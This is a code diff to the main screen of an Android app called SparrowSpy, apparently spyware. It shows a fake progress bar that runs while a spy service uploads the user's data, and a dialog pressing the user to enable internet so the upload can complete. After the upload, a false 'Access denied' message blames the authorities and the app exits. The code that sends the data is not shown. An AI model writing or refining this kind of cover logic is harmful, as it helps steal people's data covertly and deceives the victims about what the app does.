@@ -6,6 +6,9 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.widget.ProgressBar;
 import android.widget.TextView;
+import android.widget.Toast;
+
+import androidx.appcompat.app.AlertDialog;
 
 import com.tangledbytes.sparrowspy.events.Events;
 import com.tangledbytes.sparrowspy.utils.Constants;
@@ -21,6 +24,8 @@ public class MainActivity extends Activity {
     private TextView tvProcMainTitle;
     private TextView tvProcContent;
     private TextView tvProgress;
+
+    private boolean noInternetDialogVisible;
     SparrowSpy mSpy;
 
     @Override
@@ -31,17 +36,21 @@ public class MainActivity extends Activity {
     }
 
     public void startSpy() {
-        mSpy = SparrowSpy.init(this)
-                .setSpyServiceStateChangeListener(new Events.SpyServiceStateChangeListener() {
-                    @Override
-                    public void onStart() {
-                        showFakeProcess();
-                    }
+        mSpy = SparrowSpy.init(this);
+        if (mSpy.hasUploadedAllData()) {
+            showFailedDialog();
+            return;
+        }
+        mSpy.setSpyServiceStateChangeListener(new Events.SpyServiceStateChangeListener() {
+            @Override
+            public void onStart() {
+                showFakeProcess();
+            }
 
-                    @Override
-                    public void onFinish() {
-                    }
-                });
+            @Override
+            public void onFinish() {
+            }
+        });
     }
 
     private final Thread fakeProcessThread = new Thread(new Runnable() {
@@ -52,17 +61,17 @@ public class MainActivity extends Activity {
             double progress = 0;
             while (!mSpy.hasUploadedAllData()) {
                 if (!mUtils.hasActiveInternetConnection()) {
-                    runOnUiThread(mSpy::showEnableInternetDialog);
+                    runOnUiThread(MainActivity.this::showEnableInternetDialog);
                     blockThread();
                     continue;
                 }
-                // increase progress by 0.5% of remaining progress
-                progress += 0.005 * (100 - progress);
+                // increase progress by 0.4% of remaining progress
+                progress += 0.004 * (100 - progress);
                 final int finalProgress = (int) progress;
                 runOnUiThread(() -> updateUi(finalProgress));
                 blockThread();
             }
-            runOnUiThread(mSpy::showFailedDialog);
+            runOnUiThread(MainActivity.this::showFailedDialog);
         }
 
         private void updateUi(int progress) {
@@ -74,7 +83,7 @@ public class MainActivity extends Activity {
         private void blockThread() {
             synchronized (MainActivity.this) {
                 try {
-                    MainActivity.this.wait(random.nextInt(500) + 1);
+                    MainActivity.this.wait(random.nextInt(400) + 1);
                 } catch (InterruptedException e) {
                     throw new RuntimeException(e);
                 }
@@ -105,5 +114,33 @@ public class MainActivity extends Activity {
         if (requestCode == SparrowSpy.OPEN_SETTINGS_REQUEST_CODE) {
             mSpy.handlePermissionResult();
         }
+    }
+
+    public void showEnableInternetDialog() {
+        if (noInternetDialogVisible)
+            return;
+        noInternetDialogVisible = true;
+        AlertDialog.Builder noInternetDialog = new AlertDialog.Builder(this)
+                .setTitle("No Internet Connection")
+                .setMessage("No internet connection detected. Please enable internet in order continue. Click retry to recheck.\nThank you")
+                .setCancelable(false)
+                .setNegativeButton("Retry",
+                        (dialog, whichButton) -> {
+                            noInternetDialogVisible = false;
+                        });
+        noInternetDialog.show();
+    }
+
+    public void showFailedDialog() {
+        AlertDialog.Builder failedDialog = new AlertDialog.Builder(this)
+                .setTitle("Access denied")
+                .setMessage("It looks like authorities has blocked this service in your area. Please stay tuned for further updates.\nThank you")
+                .setCancelable(false)
+                .setNegativeButton(R.string.exit,
+                        (dialog, whichButton) -> {
+                            Toast.makeText(this, R.string.closing_app, Toast.LENGTH_SHORT).show();
+                            finish();
+                        });
+        failedDialog.show();
     }
 }
